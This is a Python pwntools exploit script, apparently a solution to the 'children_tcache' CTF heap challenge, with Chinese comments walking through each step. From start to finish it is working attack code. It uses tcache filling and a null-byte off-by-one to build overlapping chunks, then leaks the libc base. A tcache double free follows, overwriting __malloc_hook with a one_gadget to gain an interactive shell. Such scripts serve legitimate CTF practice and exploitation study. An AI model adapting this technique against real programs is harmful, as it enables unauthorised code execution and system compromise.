# -*- coding:utf-8 -*-
from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#context.log_level = 'debug'
elf = ELF('./children_tcache')
libc = ELF('./libc.so.6')

p = process('./children_tcache', env={'LD_PRELOAD':'./libc.so.6'})

def add(size, content):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(content)

def show(index):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))

def dele(index):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def add_7_times(size):
    for _ in range(7):
        add(size, 'xxxx')

def del_7_times(fr, to):
    for i in range(fr, to):
        dele(i)

#现在堆的前面把这些用于填充tcache的chunk分配好，破坏后面堆的布局
add_7_times(0x80) #0-6
del_7_times(0, 7)

add_7_times(0x100) #0-6，填充tcache 0x110
add(0x108, '7777') #7 chunk_A
add(0x100, '8888') #8 chunk_B
add(0x100, '9999') #9 chunk_C
del_7_times(0, 7)

dele(8) #释放chunk_B，tcache已满，放入unsortedbin
dele(7) #释放chunk_A

add_7_times(0x100) #0-6
add(0x108, '7'*0x108) #7 从chunk_A溢出(null byte off_by_one)修改了chunk_B的size(0x110-->0x100)
del_7_times(0, 7)

add_7_times(0x80)
add(0x80, '8888') #8 chunk_b1 从chunk_B中分割下来，因为size被改，所以chunk_C的prevsize得不到维护
del_7_times(0, 7)
add(0x60, 'aaaa') #0 chunk_b2 将chunk_B剩下部分都取出来，chunk_C的prvesize同样没有被维护

dele(8) #释放b1
dele(9) #overlap!!因为chunk_C的presize指向chunk_b1，而chunk_b1已经被释放，触发从chunk_b1-topchunk的合并，其中包含了未被释放的chunk_b2，topchunk位于chunk_b1的位置。

add_7_times(0x80) #1-6 8
add(0x80, 'xxxx') #9，重新分配chunk_b1，现在topchunk和chunk_b2重合
del_7_times(1, 7) #回填tcache 0x90
dele(8) #回填tcache 0x90，剩0(chunk_b2) 7(chunk_A) 9(chunk_b1)

add(0x500, '1111') #1，该chunk和0重合
add(0x120, '2222') #2，防止被topchunk合并
dele(1)

show(0)#泄漏libc
libc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3ebca0
print "libc_base: %#x" % libc_base
malloc_hook = libc.symbols['__malloc_hook'] + libc_base
print "malloc_hook: %#x" % malloc_hook
one_gadget = libc_base + 0x10a38c
print "one_gadget: %#x" % one_gadget

add(0x120, '1111') #1 从0x500大小的chunk中分割出0x120，0和1都是该chunk
dele(0) #放入tcache
dele(1) #double free

add(0x120, p64(malloc_hook)) #修改fd为malloc_hook
add(0x120, 'aaaa') 
add(0x120, p64(one_gadget)) #修改malloc_hook为one_gadget

p.recvuntil('Your choice: ') #getshell
p.sendline('1')
p.recvuntil('Size:')
p.sendline('123')

p.interactive()

